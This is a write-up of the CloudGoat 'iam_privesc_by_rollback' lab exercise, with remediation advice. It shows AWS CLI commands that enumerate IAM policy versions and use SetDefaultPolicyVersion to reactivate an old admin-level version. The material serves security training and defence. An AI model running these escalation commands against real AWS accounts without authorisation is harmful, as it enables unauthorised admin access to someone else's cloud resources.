# IAM Privilege Escalation by Rollback

**CloudGoat scenario:** `iam_privesc_by_rollback`
**Vulnerability class:** IAM policy version rollback abuse
**Difficulty:** Beginner

## Summary

AWS IAM policies keep a version history — up to 5 versions per managed policy. Only one version is "active" (the default) at any time, but older versions are **not automatically deleted**. If an old version was ever more permissive than the current one (for example, left over from testing), and a user holds the narrow `iam:SetDefaultPolicyVersion` permission, they can simply switch the policy back to that old, more permissive version — instantly escalating their own privileges without ever editing the policy's content.

This scenario simulates exactly that: a low-privilege IAM user ("Raynor") whose current policy looks harmless, but who can roll back to a forgotten admin-level version.
## Screenshots

![Policy versions](./screenshots/rollback_1_versions.png)
*Enumerating the policy's version history — v1 (the oldest) is oddly the active/default version.*

![v3 permissions](./screenshots/rollback_2_v3_admin.png)
*Inspecting v3's actual permissions — full admin (`Action: *`, `Resource: *`).*

![Escalation command](./screenshots/rollback_3_escalate.png)
*Rolling the policy back to v3 using the narrow `SetDefaultPolicyVersion` permission.*

![Verified access](./screenshots/rollback_4_verified.png)
*Verifying escalation — S3 and EC2 calls now succeed for Raynor.*

## Step-by-step

### 1. Enumerate Raynor's current permissions

```bash
aws iam list-attached-user-policies --user-name raynor-cgidl7bnp43pty --profile raynor
aws iam list-user-policies --user-name raynor-cgidl7bnp43pty --profile raynor
```

Raynor has one managed policy attached: `cg-raynor-policy-cgidl7bnp43pty`.

### 2. Check the policy's version history

```bash
aws iam get-policy --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --profile raynor
aws iam list-policy-versions --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --profile raynor
```

Result: the policy has 5 versions (v1–v5). Oddly, **v1 — the oldest — is the active/default version**, while v2 through v5 exist but are unused. That's a red flag: normally the newest version would be active.

### 3. Inspect every version's actual permissions

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --version-id v1 --profile raynor
# ...repeated for v2, v3, v4, v5
```

| Version | Permissions | Notes |
|---|---|---|
| v1 (active) | `iam:Get*`, `iam:List*`, `iam:SetDefaultPolicyVersion` | Looks read-only, but contains the escalation permission |
| v2 | Explicit `Deny` on everything unless from specific IPs | Decoy |
| **v3** | `"Action": "*"`, `"Resource": "*"`, `Allow` | **Full admin — the target** |
| v4 | `iam:Get*` only, restricted to a 2017 date range (expired) | Decoy |
| v5 | Limited S3 read actions | Minor, not useful |

The root cause: v1 grants `iam:SetDefaultPolicyVersion` — a permission that sounds harmless but actually lets a user choose *any* existing version as the active one, regardless of whether it's older or more permissive.

### 4. Escalate — roll back to the admin version

```bash
aws iam set-default-policy-version --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --version-id v3 --profile raynor
```

This switches the policy's active version to v3 (full admin) using only the narrow `SetDefaultPolicyVersion` permission — no policy edit permission was ever needed.

### 5. Verify escalation

```bash
aws iam get-policy --policy-arn arn:aws:iam::276833795973:policy/cg-raynor-policy-cgidl7bnp43pty --profile raynor   # DefaultVersionId now "v3"
aws s3 ls --profile raynor                                 # succeeds — previously would have been denied
aws ec2 describe-instances --profile raynor                # succeeds — full account visibility
```

Both calls succeed, proving Raynor now has effectively unrestricted access — despite starting with only IAM read permissions.

### 6. Clean up

```bash
cloudgoat destroy iam_privesc_by_rollback
```

Verified teardown with:
```bash
aws iam get-user --user-name raynor-cgidl7bnp43pty --profile cloudgoat   # NoSuchEntity
```

## Root cause

- Old, unused IAM policy versions were never deleted after being created (likely during testing/development).
- One of those old versions granted full admin access.
- The active policy granted `iam:SetDefaultPolicyVersion`, which allowed any existing version — old or new — to be reactivated at will.

## Remediation

1. **Audit and delete unused policy versions regularly.** AWS keeps up to 5 versions per policy; stale ones should be removed as part of routine IAM hygiene.
2. **Avoid granting `iam:SetDefaultPolicyVersion`** unless a user genuinely needs to manage policy versioning — treat it as an admin-adjacent permission, not a read-only one.
3. **Monitor for `SetDefaultPolicyVersion` calls** via CloudTrail and alert on unexpected use, especially by non-admin identities.
4. Use **AWS IAM Access Analyzer** or policy-linting tools (e.g. `PolicySentry`, `parliament`) in CI/CD to catch overly permissive policy versions before they're ever created.

## Tools used

Kali Linux, AWS CLI, CloudGoat, Terraform (via CloudGoat)
